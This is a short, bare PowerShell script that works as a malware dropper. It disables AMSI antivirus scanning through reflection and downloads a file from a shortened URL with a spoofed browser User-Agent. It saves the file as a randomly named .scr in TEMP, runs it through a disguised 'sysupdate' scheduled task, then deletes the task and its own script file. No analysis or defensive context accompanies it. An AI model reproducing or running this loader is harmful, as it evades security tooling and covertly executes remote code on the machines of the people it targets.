[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)');$wc.Headers.Add('Cache-Control','no-cache')
$fname="$env:TEMP\$([guid]::NewGuid().ToString('N').Substring(0,8)).scr"
$bytes=$wc.DownloadData('https://u.to/OnD3Ig')
[IO.File]::WriteAllBytes($fname,$bytes);$wc.Dispose()
schtasks /create /tn "sysupdate" /tr $fname /sc once /st 00:00 /f /rl limited | out-null
schtasks /run /tn "sysupdate" | out-null
schtasks /delete /tn "sysupdate" /f | out-null
cmd /c "timeout 1 >nul & del `"$env:TEMP\s.ps1`""
